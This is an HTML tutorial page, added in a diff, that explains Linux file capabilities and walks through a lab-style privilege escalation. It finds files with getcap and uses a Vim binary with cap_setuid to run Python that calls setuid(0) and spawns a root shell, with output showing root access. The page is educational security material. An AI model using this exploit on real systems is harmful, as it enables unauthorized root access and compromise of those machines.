@@ -1,0 +1,95 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>Linux Capabilities Exploitation - Rare Code Base</title>
+
+    <meta name="description"
+        content="Understand how to exploit Linux file capabilities for privilege escalation. Includes real-world examples and step-by-step instructions.">
+    <meta name="keywords"
+        content="Linux Capabilities, Linux Privilege Escalation, cap_setuid, getcap, Ethical Hacking, Root Access, Cybersecurity Labs, InfoSec, Linux Security">
+
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+    <script src="/js/main.js" defer></script>
+    <script src="/js/sidebar.js" defer></script>
+</head>
+
+<body>
+
+    <div id="navbar-placeholder"></div>
+
+    <main class="d-lg-flex flex-nowrap d-block">
+        <div id="sidebar-placeholder"></div>
+
+        <div class="content p-4">
+            <h1 class="mt-4">Understanding and Exploiting Linux Capabilities</h1>
+          
+            <p>
+              In Linux, capabilities break the all-powerful root permissions into smaller specific ones. Instead of giving full root access to a program, you can give it only the permissions it needs. But if these are not configured correctly, they can be abused to get full root access.
+            </p>
+          
+            <h3 class="mt-5">What Are Linux Capabilities?</h3>
+            <p>
+              Earlier, only the root user could do special tasks like binding to port 80 or switching user accounts. Now, capabilities allow you to give such powers to normal programs, but only the specific ones they need.
+            </p>
+          
+            <p><strong>Examples:</strong></p>
+            <ul>
+              <li><code>CAP_NET_BIND_SERVICE</code> – Bind to ports like 80, 443.</li>
+              <li><code>CAP_SETUID</code> – Change user ID (can be used to become root).</li>
+              <li><code>CAP_SYS_ADMIN</code> – Very powerful, almost equal to root access.</li>
+            </ul>
+          
+            <h3 class="mt-5">How to Find Files with Capabilities</h3>
+            <p>
+              You can use this command to find all files with special capabilities:
+            </p>
+            <pre><code>$ getcap -r / 2>/dev/null</code></pre>
+          
+            <p>Here’s an example output:</p>
+            <img src="images/capabilities-list.png" alt="Output of getcap showing files with special capabilities" style="max-width: 100%; border: 1px solid #ccc;">
+          
+            <p>
+              In this output, you can see files like <code>/home/karen/vim</code> with <code>cap_setuid+ep</code>. This means the Vim binary can change its user ID — a big security risk if it can run code.
+            </p>
+          
+            <h3 class="mt-5">How to Exploit a File with CAP_SETUID</h3>
+            <p>
+              Let's say we have access to the file <code>/home/karen/vim</code>, which has the <code>cap_setuid</code> capability. Vim allows running Python code — so we can use that to switch our user ID to root and get a root shell.
+            </p>
+          
+            <img src="images/check-python-version.png" alt="Checking Python version in terminal" style="max-width: 100%; border: 1px solid #ccc;">
+          
+            <p>Then run this command to exploit the capability:</p>
+            <pre><code>$ /home/karen/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'</code></pre>
+          
+            <p>This command does the following:</p>
+            <ul>
+              <li><code>os.setuid(0)</code> – Switches the user ID to root.</li>
+              <li><code>os.execl(...)</code> – Launches a new shell as root.</li>
+            </ul>
+          
+            <p>Once you run it, you get a root shell. Check your privileges using:</p>
+            <pre><code># whoami
+root</code></pre>
+          
+            <img src="images/root-shell-success.png" alt="Root shell gained after exploiting Vim with setuid capability" style="max-width: 100%; border: 1px solid #ccc;">
+          
+            <h3 class="mt-5">Why This Works</h3>
+            <p>
+              The capability <code>cap_setuid+ep</code> allows the program to change its user ID. Since Vim supports Python code execution, we used it to change our UID to 0 (root), and then launched a root shell. This bypasses the need to make the binary SUID — making it harder to detect in some systems.
+            </p>
+          </div>
+          
+    </main>
+
+    <div id="footer-placeholder"></div>
+
+</body>
+
+</html>
